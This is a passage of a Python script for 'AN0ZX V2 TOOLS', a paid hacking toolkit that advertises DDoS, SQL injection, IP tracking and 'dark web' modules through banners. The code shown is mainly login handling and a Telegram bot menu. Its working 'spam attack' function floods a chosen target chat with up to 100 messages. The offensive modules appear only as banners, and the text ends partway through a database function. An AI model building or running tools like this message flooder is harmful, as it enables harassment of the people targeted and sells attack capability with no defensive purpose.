#!/usr/bin/env python3
"""
AN0ZX V2 TOOLS - Professional Security Toolkit
Creator: mrzxx (@Zxxtirwd) & AN0MALIXPLOIT (@An0maliXGR)
License Required: AN0ZX
Price: Rp 12.000 (Contact @Zxxtirwd or @An0maliXGR)
Version: 2.0
"""

import os
import sys
import time
import socket
import subprocess
import requests
import threading
import random
import datetime
import urllib.parse
import re
import json
import hashlib
import getpass
import string
import ipaddress
import sqlite3
import tempfile
import threading
from colorama import Fore, Style, init
from collections import Counter
import stem.process
from stem import Signal
from stem.control import Controller

# Initialize colorama
init(autoreset=True)

# Database file for user accounts
DB_FILE = "users.json"
BOT_DB_FILE = "bot_users.db"
LICENSE_KEY = "AN0ZX"  # Valid license key

# ASCII Art Definitions
LOGIN_ASCII = f"""{Fore.CYAN}
██╗      ██████╗  ██████╗ ██╗███╗   ██╗    ██████╗ ██╗   ██╗██╗     ██╗   ██╗
██║     ██╔═══██╗██╔════╝ ██║████╗  ██║    ██╔══██╗██║   ██║██║     ██║   ██║
██║     ██║   ██║██║  ███╗██║██╔██╗ ██║    ██║  ██║██║   ██║██║     ██║   ██║
██║     ██║   ██║██║   ██║██║██║╚██╗██║    ██║  ██║██║   ██║██║     ██║   ██║
███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║    ██████╔╝╚██████╔╝███████╗╚██████╔╝
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝    ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ 
                                                                             
{Fore.YELLOW}  ____
{Fore.YELLOW}/        \__________
{Fore.YELLOW}|   0     _____   ___  \\
{Fore.YELLOW}\\____/         |_|     |_|
{Style.RESET_ALL}"""

WELCOME_ASCII = f"""{Fore.CYAN}
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗    
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝    
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗      
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝      
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗    
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝    
{Style.RESET_ALL}"""

MAIN_ASCII = f"""{Fore.MAGENTA}
 █████╗ ███╗   ██╗ ██████╗ ███████╗██╗  ██╗  ████████╗ ██████╗  ██████╗ ██╗     ███████╗
██╔══██╗████╗  ██║██╔═████╗╚══███╔╝╚██╗██╔╝  ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
███████║██╔██╗ ██║██║██╔██║  ███╔╝  ╚███╔╝█████╗██║   ██║   ██║██║   ██║██║     ███████╗
██╔══██║██║╚██╗██║████╔╝██║ ███╔╝   ██╔██╗╚════╝██║   ██║   ██║██║   ██║██║     ╚════██║
██║  ██║██║ ╚████║╚██████╔╝███████╗██╔╝ ██╗     ██║   ╚██████╔╝╚██████╔╝███████╗███████║
╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
{Style.RESET_ALL}"""

DDOS_ASCII = f"""{Fore.RED}
██████╗ ██████╗  ██████╗ ███████╗    
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    
██║  ██║██║  ██║██║   ██║███████╗    
██║  ██║██║  ██║██║   ██║╚════██║    
██████╔╝██████╔╝╚██████╔╝███████║    
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    
{Style.RESET_ALL}"""

SQL_INJECT_ASCII = f"""{Fore.YELLOW}
███████╗ ██████╗ ██╗     ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗    
██╔════╝██╔═══██╗██║     ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝    
███████╗██║   ██║██║     ██║██╔██╗ ██║     ██║█████╗  ██║        ██║       
╚════██║██║▄▄ ██║██║     ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║       
███████║╚██████╔╝███████╗██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║       
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝       
{Style.RESET_ALL}"""

SQLMAP_ASCII = f"""{Fore.GREEN}
███████╗ ██████╗ ██╗     ███╗   ███╗ █████╗ ██████╗ 
██╔════╝██╔═══██╗██║     ████╗ ████║██╔══██╗██╔══██╗
███████╗██║   ██║██║     ██╔████╔██║███████║██████╔╝
╚════██║██║▄▄ ██║██║     ██║╚██╔╝██║██╔══██║██╔═══╝ 
███████║╚██████╔╝███████╗██║ ╚═╝ ██║██║  ██║██║     
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
{Style.RESET_ALL}"""

NMAP_ASCII = f"""{Fore.CYAN}
$$\   $$\                                   
$$$\  $$ |                                  
$$$$\ $$ |$$$$$$\$$$$\   $$$$$$\   $$$$$$\  
$$ $$\$$ |$$  _$$  _$$\  \____$$\ $$  __$$\ 
$$ \$$$$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ |
$$ |\$$$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |
$$ | \$$ |$$ | $$ | $$ |\$$$$$$$ |$$$$$$$  |
\__|  \__|\__| \__| \__| \_______|$$  ____/ 
                                  $$ |      
                                  $$ |      
                                  \__|      
{Style.RESET_ALL}"""

OSINT_ASCII = f"""{Fore.MAGENTA}
██╗     ███╗███████╗███╗   ██╗██╗   ██╗ ██████╗ ███████╗██╗███╗   ██╗████████╗
████╗ ████║██╔════╝████╗  ██║██║   ██║██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║██║   ██║███████╗██║██╔██╗ ██║   ██║   
██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║██║   ██║╚════██║██║██║╚██╗██║   ██║   
██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝╚██████╔╝███████║██║██║ ╚████║   ██║   
╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
{Style.RESET_ALL}"""

PASSWORD_GEN_ASCII = f"""{Fore.GREEN}
██████╗  █████╗ ███████╗███████╗██╗    ██╗ ██████╗ ██████╗ ██████╗      ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗     
██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗    
██████╔╝███████║███████╗███████╗██║ █╗ ██║██║   ██║██████╔╝██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝    
██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║   ██║██╔══██╗██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗    
██║     ██║  ██║███████║███████║╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║    
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝    
{Style.RESET_ALL}"""

NAME_TRACKING_ASCII = f"""{Fore.CYAN}
████████╗██████╗  █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗     ███╗   ██╗ █████╗ ███╗   ███╗ █████╗     
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝     ████╗  ██║██╔══██╗████╗ ████║██╔══██╗    
   ██║   ██████╔╝███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗    ██╔██╗ ██║███████║██╔████╔██║███████║    
   ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║    ██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══██║    
   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝    ██║ ╚████║██║  ██║██║ ╚═╝ ██║██║  ██║    
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝    
{Style.RESET_ALL}"""

IP_TRACKING_ASCII = f"""{Fore.YELLOW}
██╗      █████╗  ██████╗ █████╗ ██╗  ██╗     ██╗██████╗ 
██║     ██╔══██╗██╔════╝██╔══██╗██║ ██╔╝     ██║██╔══██╗
██║     ███████║██║     ███████║█████╔╝█████╗██║██████╔╝
██║     ██╔══██║██║     ██╔══██║██╔═██╗╚════╝██║██╔═══╝ 
███████╗██║  ██║╚██████╗██║  ██║██║  ██╗     ██║██║     
╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝╚═╝     
{Style.RESET_ALL}"""

BOT_CONTROL_ASCII = f"""{Fore.CYAN}
██████╗  ██████╗ ████████╗  ██╗  ██╗
██╔══██╗██╔═══██╗╚══██╔══╝  ╚██╗██╔╝
██████╔╝██║   ██║   ██║█████╗╚███╔╝ 
██╔══██╗██║   ██║   ██║╚════╝██╔██╗ 
██████╔╝╚██████╔╝   ██║     ██╔╝ ██╗
╚═════╝  ╚═════╝    ╚═╝     ╚═╝  ╚═╝
                                    
{Style.RESET_ALL}"""

DARK_MENU_ASCII = f"""{Fore.RED}
███╗   ██╗██╗   ██╗███╗   ███╗███████╗███╗   ██╗██╗   ██╗
████╗  ██║██║   ██║████╗ ████║██╔════╝████╗  ██║██║   ██║
██╔██╗ ██║██║   ██║██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║
██║╚██╗██║██║   ██║██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
██║ ╚████║╚██████╔╝██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
                                                         
{Fore.RED}██████╗  █████╗ ███╗   ██╗ ██████╗ ███████╗██████╗ 
{Fore.RED}██╔══██╗██╔══██╗████╗  ██║██╔════╝ ██╔════╝██╔══██╗
{Fore.RED}██║  ██║███████║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝
{Fore.RED}██║  ██║██╔══██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗
{Fore.RED}██████╔╝██║  ██║██║ ╚████║╚██████╔╝███████╗██║  ██║
{Fore.RED}╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}"""

DARK_WEB_ASCII = f"""{Fore.RED}
██████╗  █████╗ ██████╗ ██╗  ██╗██╗    ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██║    ██║██╔════╝██╔══██╗
██║  ██║███████║██████╔╝█████╔╝ ██║ █╗ ██║█████╗  ██████╔╝
██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║███╗██║██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██║██║  ██╗╚███╔███╔╝███████╗██████╔╝
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚══════╝╚═════╝ 
                                                          {Fore.YELLOW}
⚠️  ⚠️  ⚠️  DANGER! DANGER! DANGER! ⚠️  ⚠️  ⚠️
{Style.RESET_ALL}"""

PORT_SCAN_ASCII = f"""{Fore.MAGENTA}
██████╗  ██████╗ ██████╗ ████████╗███████╗ ██████╗ █████╗ ███╗   ██╗
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝██╔════╝██╔══██╗████╗  ██║
██████╔╝██║   ██║██████╔╝   ██║   ███████╗██║     ███████║██╔██╗ ██║
██╔═══╝ ██║   ██║██╔══██╗   ██║   ╚════██║██║     ██╔══██║██║╚██╗██║
██║     ╚██████╔╝██║  ██║   ██║   ███████║╚██████╗██║  ██║██║ ╚████║
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{Fore.CYAN}Shadow Scan - Advanced Port Scanning System
{Style.RESET_ALL}"""

VULN_HUNTER_ASCII = f"""{Fore.YELLOW}
██╗   ██╗██╗   ██╗██╗     ███╗   ██╗      ██╗    ██╗███████╗██████╗ 
██║   ██║██║   ██║██║     ████╗  ██║      ██║    ██║██╔════╝██╔══██╗
██║   ██║██║   ██║██║     ██╔██╗ ██║█████╗██║ █╗ ██║█████╗  ██████╔╝
╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║╚════╝██║███╗██║██╔══╝  ██╔══██╗
 ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║      ╚███╔███╔╝███████╗██████╔╝
  ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝       ╚══╝╚══╝ ╚══════╝╚═════╝ 
{Fore.CYAN}Web Vulnerability Scanner - Professional Grade
{Style.RESET_ALL}"""

# Database functions
def load_users():
    """Load users from database file"""
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_users(users):
    """Save users to database file"""
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(users, f, indent=4)
        return True
    except:
        return False

def hash_password(password):
    """Hash password using SHA-256"""
    return hashlib.sha256(password.encode()).hexdigest()

# Bot Database functions
def init_bot_db():
    """Initialize bot user database"""
    try:
        conn = sqlite3.connect(BOT_DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bot_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT,
                user_id TEXT,
                chat_id TEXT,
                message TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(Fore.RED + f"[✗] Error initializing bot database: {str(e)}")
        return False

def save_bot_user(username, user_id, chat_id, message):
    """Save bot user interaction to database"""
    try:
        conn = sqlite3.connect(BOT_DB_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO bot_users (username, user_id, chat_id, message)
            VALUES (?, ?, ?, ?)
        ''', (username, user_id, chat_id, message))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(Fore.RED + f"[✗] Error saving bot user: {str(e)}")
        return False

def get_bot_users():
    """Get all bot users from database"""
    try:
        conn = sqlite3.connect(BOT_DB_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM bot_users ORDER BY timestamp DESC')
        rows = cursor.fetchall()
        conn.close()
        return rows
    except Exception as e:
        print(Fore.RED + f"[✗] Error getting bot users: {str(e)}")
        return []

# Animation functions
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def typing_effect(text, delay=0.03):
    """Typing animation effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def color_changer(text):
    """Color changing effect for text"""
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    result = ""
    for i, char in enumerate(text):
        result += colors[i % len(colors)] + char
    return result + Style.RESET_ALL

def loading_animation(text="Loading", duration=2):
    """Loading animation"""
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    start_time = time.time()
    i = 0
    
    while time.time() - start_time < duration:
        sys.stdout.write(f"\r{Fore.CYAN}[{chars[i % len(chars)]}] {text}...")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    
    print(f"\r{Fore.GREEN}[✓] {text} completed!")

def welcome_animation():
    """Welcome screen animation"""
    clear_screen()
    
    # Type welcome text
    print(Fore.CYAN + "=" * 70)
    typing_effect(WELCOME_ASCII)
    print(Fore.CYAN + "=" * 70)
    
    # Color changing effect
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    welcome_text = "AN0ZX V2 TOOLS - Professional Security Toolkit"
    
    for i in range(10):
        clear_screen()
        print(Fore.CYAN + "=" * 70)
        print(colors[i % len(colors)] + WELCOME_ASCII)
        print(Fore.CYAN + "=" * 70)
        print(colors[(i+1) % len(colors)] + welcome_text.center(70))
        print(Fore.CYAN + "=" * 70)
        time.sleep(0.2)
    
    loading_animation("Initializing system", 3)
    time.sleep(1)

# User authentication functions
def create_account():
    """Create new user account"""
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "CREATE ACCOUNT")
    print(Fore.CYAN + "=" * 70)
    
    users = load_users()
    
    while True:
        print(Fore.YELLOW + "\n[!] Contact @Zxxtirwd or @An0maliXGR to purchase license")
        print(Fore.YELLOW + f"[!] Price: Rp 12.000 | License Key: {LICENSE_KEY}\n")
        
        license_key = input(Fore.CYAN + "[?] Enter License Key: " + Fore.WHITE).strip()
        
        if license_key != LICENSE_KEY:
            print(Fore.RED + "[✗] Invalid license key!")
            print(Fore.YELLOW + "[!] Contact @Zxxtirwd or @An0maliXGR")
            choice = input(Fore.YELLOW + "[?] Try again? (y/n): ").lower()
            if choice != 'y':
                return None
            continue
        
        username = input(Fore.CYAN + "[?] Choose Username: " + Fore.WHITE).strip()
        
        if username in users:
            print(Fore.RED + "[✗] Username already exists!")
            continue
        
        if len(username) < 3:
            print(Fore.RED + "[✗] Username must be at least 3 characters!")
            continue
        
        password = getpass.getpass(Fore.CYAN + "[?] Choose Password: " + Fore.WHITE)
        
        if len(password) < 6:
            print(Fore.RED + "[✗] Password must be at least 6 characters!")
            continue
        
        confirm_pass = getpass.getpass(Fore.CYAN + "[?] Confirm Password: " + Fore.WHITE)
        
        if password != confirm_pass:
            print(Fore.RED + "[✗] Passwords do not match!")
            continue
        
        # Create user
        users[username] = {
            "password": hash_password(password),
            "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "license": license_key,
            "version": "2.0"
        }
        
        if save_users(users):
            print(Fore.GREEN + f"\n[✓] Account created successfully!")
            print(Fore.CYAN + f"[+] Username: {username}")
            print(Fore.CYAN + f"[+] Created: {users[username]['created_at']}")
            print(Fore.GREEN + "[+] Version: AN0ZX V2.0")
            print(Fore.GREEN + "\n[✓] You can now login")
            time.sleep(3)
            return username
        else:
            print(Fore.RED + "[✗] Failed to create account!")
            return None

def login():
    """User login"""
    clear_screen()
    print(LOGIN_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 30 + "LOGIN")
    print(Fore.CYAN + "=" * 70)
    
    users = load_users()
    
    attempts = 3
    while attempts > 0:
        username = input(Fore.CYAN + "\n[?] Username: " + Fore.WHITE).strip()
        password = getpass.getpass(Fore.CYAN + "[?] Password: " + Fore.WHITE)
        
        if username in users:
            if users[username]["password"] == hash_password(password):
                print(Fore.GREEN + f"\n[✓] Login successful!")
                print(Fore.CYAN + f"[+] Welcome to AN0ZX V2.0, {username}")
                loading_animation(f"Loading V2 features", 2)
                return username
            else:
                attempts -= 1
                print(Fore.RED + f"[✗] Invalid password! {attempts} attempts remaining")
        else:
            attempts -= 1
            print(Fore.RED + f"[✗] User not found! {attempts} attempts remaining")
        
        if attempts == 0:
            print(Fore.RED + "\n[✗] Too many failed attempts!")
            time.sleep(2)
            return None
        
        choice = input(Fore.YELLOW + "[?] Create new account? (y/n): ").lower()
        if choice == 'y':
            return create_account()
    
    return None

# ===========================================
# BOT CONTROL MODULE
# ===========================================
def bot_control_menu():
    """Bot Control Menu for Telegram"""
    clear_screen()
    typing_effect(BOT_CONTROL_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 20 + "TELEGRAM BOT CONTROL SYSTEM")
    print(Fore.CYAN + "=" * 70)
    
    # Initialize bot database
    init_bot_db()
    
    while True:
        print(Fore.YELLOW + "\n[1] Setup Bot Token")
        print(Fore.YELLOW + "[2] Change Bot Name")
        print(Fore.YELLOW + "[3] Change Bot Bio")
        print(Fore.YELLOW + "[4] Send Message to User")
        print(Fore.YELLOW + "[5] Spam Message to User")
        print(Fore.YELLOW + "[6] View Bot User Database")
        print(Fore.YELLOW + "[7] Clear Database")
        print(Fore.YELLOW + "[8] Back to Main Menu")
        print(Fore.CYAN + "-" * 70)
        
        choice = input(Fore.CYAN + "\n[?] Select option (1-8): " + Fore.WHITE).strip()
        
        if choice == "1":
            setup_bot_token()
        elif choice == "2":
            change_bot_name()
        elif choice == "3":
            change_bot_bio()
        elif choice == "4":
            send_message_to_user()
        elif choice == "5":
            spam_message()
        elif choice == "6":
            view_bot_database()
        elif choice == "7":
            clear_bot_database()
        elif choice == "8":
            typing_effect("\nReturning to main menu...")
            return
        else:
            print(Fore.RED + "[✗] Invalid choice!")

def setup_bot_token():
    """Setup Telegram Bot Token"""
    clear_screen()
    print(BOT_CONTROL_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "SETUP BOT TOKEN")
    print(Fore.CYAN + "=" * 70)
    
    token = input(Fore.CYAN + "\n[?] Enter Bot Token: " + Fore.WHITE).strip()
    
    if not token:
        print(Fore.RED + "[✗] Token cannot be empty!")
        time.sleep(2)
        return
    
    # Save token to file
    try:
        with open("bot_token.txt", "w") as f:
            f.write(token)
        print(Fore.GREEN + "[✓] Bot token saved successfully!")
        print(Fore.YELLOW + "[!] Token saved to: bot_token.txt")
    except Exception as e:
        print(Fore.RED + f"[✗] Error saving token: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def get_bot_token():
    """Get bot token from file"""
    try:
        with open("bot_token.txt", "r") as f:
            return f.read().strip()
    except:
        return None

def change_bot_name():
    """Change Telegram Bot Name"""
    clear_screen()
    print(BOT_CONTROL_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "CHANGE BOT NAME")
    print(Fore.CYAN + "=" * 70)
    
    token = get_bot_token()
    if not token:
        print(Fore.RED + "\n[✗] Bot token not found!")
        print(Fore.YELLOW + "[!] Please setup bot token first")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    new_name = input(Fore.CYAN + "\n[?] Enter new bot name: " + Fore.WHITE).strip()
    
    if not new_name:
        print(Fore.RED + "[✗] Name cannot be empty!")
        time.sleep(2)
        return
    
    print(Fore.CYAN + "\n[+] Changing bot name...")
    loading_animation("Updating bot name", 2)
    
    # Telegram Bot API - setMyName
    url = f"https://api.telegram.org/bot{token}/setMyName"
    data = {"name": new_name}
    
    try:
        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            result = response.json()
            if result.get("ok"):
                print(Fore.GREEN + f"[✓] Bot name changed to: {new_name}")
            else:
                print(Fore.RED + f"[✗] Failed: {result.get('description', 'Unknown error')}")
        else:
            print(Fore.RED + f"[✗] HTTP Error: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"[✗] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def change_bot_bio():
    """Change Telegram Bot Bio/Description"""
    clear_screen()
    print(BOT_CONTROL_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "CHANGE BOT BIO")
    print(Fore.CYAN + "=" * 70)
    
    token = get_bot_token()
    if not token:
        print(Fore.RED + "\n[✗] Bot token not found!")
        print(Fore.YELLOW + "[!] Please setup bot token first")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    new_bio = input(Fore.CYAN + "\n[?] Enter new bot bio: " + Fore.WHITE).strip()
    
    if not new_bio:
        print(Fore.RED + "[✗] Bio cannot be empty!")
        time.sleep(2)
        return
    
    print(Fore.CYAN + "\n[+] Changing bot bio...")
    loading_animation("Updating bot bio", 2)
    
    # Telegram Bot API - setMyDescription
    url = f"https://api.telegram.org/bot{token}/setMyDescription"
    data = {"description": new_bio}
    
    try:
        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            result = response.json()
            if result.get("ok"):
                print(Fore.GREEN + f"[✓] Bot bio updated!")
            else:
                print(Fore.RED + f"[✗] Failed: {result.get('description', 'Unknown error')}")
        else:
            print(Fore.RED + f"[✗] HTTP Error: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"[✗] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def send_message_to_user():
    """Send message to specific Telegram user"""
    clear_screen()
    print(BOT_CONTROL_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "SEND MESSAGE TO USER")
    print(Fore.CYAN + "=" * 70)
    
    token = get_bot_token()
    if not token:
        print(Fore.RED + "\n[✗] Bot token not found!")
        print(Fore.YELLOW + "[!] Please setup bot token first")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    chat_id = input(Fore.CYAN + "\n[?] Enter Target Chat ID: " + Fore.WHITE).strip()
    message = input(Fore.CYAN + "[?] Enter Message: " + Fore.WHITE).strip()
    
    if not chat_id or not message:
        print(Fore.RED + "[✗] Chat ID and Message are required!")
        time.sleep(2)
        return
    
    print(Fore.CYAN + "\n[+] Sending message...")
    loading_animation(f"Sending to {chat_id}", 2)
    
    # Telegram Bot API - sendMessage
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"
    }
    
    try:
        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            result = response.json()
            if result.get("ok"):
                print(Fore.GREEN + f"[✓] Message sent successfully to {chat_id}")
                
                # Save to database
                username = result.get("result", {}).get("from", {}).get("username", "Unknown")
                save_bot_user(username, chat_id, chat_id, message)
            else:
                print(Fore.RED + f"[✗] Failed: {result.get('description', 'Unknown error')}")
        else:
            print(Fore.RED + f"[✗] HTTP Error: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"[✗] Error: {str(e)}")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def spam_message():
    """Spam message to Telegram user"""
    clear_screen()
    print(BOT_CONTROL_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "SPAM MESSAGE SYSTEM")
    print(Fore.CYAN + "=" * 70)
    
    token = get_bot_token()
    if not token:
        print(Fore.RED + "\n[✗] Bot token not found!")
        print(Fore.YELLOW + "[!] Please setup bot token first")
        input(Fore.YELLOW + "\n[?] Press Enter to continue...")
        return
    
    chat_id = input(Fore.CYAN + "\n[?] Enter Target Chat ID: " + Fore.WHITE).strip()
    message = input(Fore.CYAN + "[?] Enter Spam Message: " + Fore.WHITE).strip()
    
    try:
        count = int(input(Fore.CYAN + "[?] Number of messages (1-100): " + Fore.WHITE) or "10")
        delay = float(input(Fore.CYAN + "[?] Delay between messages (seconds): " + Fore.WHITE) or "1.0")
    except:
        count = 10
        delay = 1.0
    
    count = max(1, min(100, count))
    
    if not chat_id or not message:
        print(Fore.RED + "[✗] Chat ID and Message are required!")
        time.sleep(2)
        return
    
    print(Fore.RED + f"\n[!] WARNING: Sending {count} messages to {chat_id}")
    confirm = input(Fore.RED + "[?] Confirm? (y/n): " + Fore.WHITE).lower()
    
    if confirm != 'y':
        print(Fore.YELLOW + "[!] Cancelled")
        time.sleep(1)
        return
    
    print(Fore.CYAN + "\n[+] Starting spam attack...")
    
    sent = 0
    failed = 0
    
    for i in range(count):
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": f"{message} ({i+1}/{count})",
                "parse_mode": "HTML"
            }
            
            response = requests.post(url, json=data, timeout=5)
            if response.status_code == 200:
                sent += 1
                print(Fore.GREEN + f"[{i+1}/{count}] Message sent ✓")
            else:
                failed += 1
                print(Fore.RED + f"[{i+1}/{count}] Failed to send ✗")
            
            time.sleep(delay)
            
        except Exception as e:
            failed += 1
            print(Fore.RED + f"[{i+1}/{count}] Error: {str(e)[:50]}")
            time.sleep(delay)
    
    print(Fore.CYAN + "\n" + "="*70)
    print(Fore.GREEN + f"[✓] SPAM COMPLETED!")
    print(Fore.CYAN + f"[+] Total sent: {sent}/{count}")
    print(Fore.RED + f"[+] Failed: {failed}/{count}")
    print(Fore.CYAN + "="*70)
    
    # Save to database
    save_bot_user("SPAM_TARGET", chat_id, chat_id, f"Spam: {message} ({count} times)")
    
    input(Fore.YELLOW + "\n[?] Press Enter to continue...")

def view_bot_database():
    """View bot user database"""
    clear_screen()
    print(BOT_CONTROL_ASCII)
    print(Fore.CYAN + "=" * 70)
    print(Fore.YELLOW + " " * 25 + "BOT USER DATABASE")
    print(Fore.CYAN + "=" * 70)
    
    users = get_bot_users()
    
    if not users:
        print(Fore.YELLOW + "\n[!] Database is empty")
